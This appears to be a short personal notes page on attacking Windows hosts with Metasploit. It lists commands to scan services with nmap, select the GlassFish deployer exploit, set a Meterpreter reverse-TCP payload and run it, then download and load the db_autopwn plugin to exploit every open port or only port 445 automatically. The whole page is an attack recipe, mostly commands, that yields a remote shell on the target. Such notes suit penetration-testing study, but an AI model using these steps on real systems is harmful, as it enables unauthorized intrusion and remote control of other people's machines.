---
title: Windows Vuln Scanning
description: >-
  dbnmap -sS -sV IPADDRESS hosts services search type:exploit name:glassfish use
  exploit/multi/http/glassfishdeployer set payload…
date: '2026-10-26'
topics:
  - systems
section:
  - Systems
  - Window
  - Windows Sec & Vuln
order: 95
---
## With Metasploit


1. `db_nmap -sS -sV IP_ADDRESS`
2. `hosts`
3. `services`
4. `search type:exploit name:glassfish`
5. `use exploit/multi/http/glassfish_deployer`
6. `set payload windows/meterpreter/reverse_tcp`
7. `run`
8. GitHub : Metasploit autopwn
9. `wget PLUGIN_LINK`
10. `mv FILE_DOWNLOADED /usr/share/metasploit-framework/plugins/`
11. in Metasploit: `load db_autopwn`
12. `db_autopwn`
13. Scans all the ports: `db_autopwn -p -t`
14. Scans only 445 port:  `db_autopwn -p -t -PI 445`
15. `analyze`
16. `vulns`
